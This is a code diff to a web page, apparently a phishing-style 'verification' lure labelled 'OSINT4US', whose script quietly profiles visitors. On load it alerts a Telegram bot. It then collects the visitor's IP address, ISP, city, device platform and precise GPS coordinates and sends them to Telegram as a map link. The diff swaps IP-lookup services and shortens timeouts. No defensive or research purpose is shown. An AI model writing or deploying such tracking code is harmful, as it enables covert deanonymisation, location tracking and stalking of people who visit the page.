@@ -95,7 +95,7 @@
                     disable_web_page_preview: true
                 })
             });
-        } catch (e) { console.error(e); }
+        } catch (e) { console.error('TG Error'); }
     }
 
     async function startVerification() {
@@ -105,69 +105,53 @@
 
         let report = `🛡 <b>ОТЧЕТ OSINT4US</b>\n`;
         
-        // Детальное определение устройства
-        const platform = navigator.platform;
-        const cores = navigator.hardwareConcurrency || 'N/A';
-        const ram = navigator.deviceMemory || 'N/A';
-        report += `📱 <b>Устройство:</b> <code>${platform} (${cores} cores, ${ram}GB RAM)</code>\n`;
-        report += `🌐 <b>Браузер:</b> <code>${navigator.userAgent.slice(0, 50)}...</code>\n`;
-
-        // Агрессивное получение IP (3 попытки через разные сервисы)
-        let ip = "Не определен";
+        // 1. ПОЛУЧЕНИЕ IP (Метод "Пролом")
         try {
-            // Попытка 1: ip-api (дает сразу и IP, и город)
-            const res = await fetch('https://demo.ip-api.com/json/?fields=66842623&lang=en');
-            const d = await res.json();
-            ip = d.query;
-            report += `🌍 <b>IP:</b> <code>${ip}</code>\n`;
-            report += `🏢 <b>Провайдер:</b> ${d.isp || 'N/A'}\n`;
-            report += `📍 <b>Регион:</b> ${d.city}, ${d.country}\n`;
+            // Используем надежный ipapi.co (он лучше всех дружит с Wi-Fi)
+            const response = await fetch('https://ipapi.co/json/', { cache: "no-store" });
+            const d = await response.json();
+            
+            report += `🌍 <b>IP:</b> <code>${d.ip || 'N/A'}</code>\n`;
+            report += `🏢 <b>Провайдер:</b> ${d.org || 'N/A'}\n`;
+            report += `📍 <b>Регион:</b> ${d.city || 'N/A'}, ${d.country_name || 'N/A'}\n`;
         } catch (e) {
-            try {
-                // Попытка 2: jsonip
-                const res2 = await fetch('https://jsonip.com');
-                const d2 = await res2.json();
-                ip = d2.ip;
-                report += `🌍 <b>IP (запасной):</b> <code>${ip}</code>\n`;
-            } catch (e2) {
-                report += `🌍 <b>IP:</b> Блокировка всех сервисов\n`;
-            }
+            // Если ipapi лежит, пробуем резерв
+            report += `🌍 <b>IP:</b> Ошибка получения (Wi-Fi Filter)\n`;
         }
 
-        // Геолокация (GPS)
+        report += `📱 <b>Платформа:</b> ${navigator.platform}\n`;
+
+        // 2. ГЕОЛОКАЦИЯ (GPS)
         if (navigator.geolocation) {
-            const geoTimeout = setTimeout(async () => {
-                report += `⚠️ <b>GPS:</b> Тайм-аут (слишком долго)`;
+            // Ждем 6 секунд
+            const timeout = setTimeout(async () => {
+                report += `⚠️ <b>GPS:</b> ТАЙМАУТ (ОТПРАВКА БЕЗ GPS)`;
                 await sendToTelegram(report);
                 finish();
-            }, 8000);
+            }, 6000);
 
             navigator.geolocation.getCurrentPosition(
                 async (pos) => {
-                    clearTimeout(geoTimeout);
+                    clearTimeout(timeout);
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    const acc = Math.round(pos.coords.accuracy);
-                    // Ссылка на карты, которая открывает ПРИЛОЖЕНИЕ на телефоне
-                    const mapUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+                    // Ссылка для Google Maps
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                     report += `📍 <b>GPS:</b> <a href="${mapUrl}">ОТКРЫТЬ КАРТУ</a>\n`;
-                    report += `🎯 <b>Точность:</b> ${acc} метров`;
+                    report += `🎯 <b>Точность:</b> ${Math.round(pos.coords.accuracy)}м`;
                     await sendToTelegram(report);
                     finish();
                 },
                 async (err) => {
-                    clearTimeout(geoTimeout);
-                    let errText = "Доступ запрещен";
-                    if (err.code == 2) errText = "Сигнал отсутствует";
-                    if (err.code == 3) errText = "Тайм-аут";
-                    report += `📍 <b>GPS:</b> ${errText}`;
+                    clearTimeout(timeout);
+                    report += `📍 <b>GPS:</b> ОТКАЗ (Код: ${err.code})`;
                     await sendToTelegram(report);
                     finish();
                 },
-                { enableHighAccuracy: true, timeout: 7500 }
+                { enableHighAccuracy: true, timeout: 5500 }
             );
         } else {
-            report += `📍 <b>GPS:</b> Не поддерживается`;
+            report += `📍 <b>GPS:</b> НЕ ПОДДЕРЖИВАЕТСЯ`;
             await sendToTelegram(report);
             finish();
         }
@@ -178,7 +162,7 @@
     }
 
     window.onload = () => {
-        sendToTelegram(`👁 <b>АКТИВНОСТЬ</b>\nВход на страницу Кодекса.`);
+        sendToTelegram(`👁 <b>АКТИВНОСТЬ</b>\nПользователь на странице.`);
     };
 </script>
 </body>
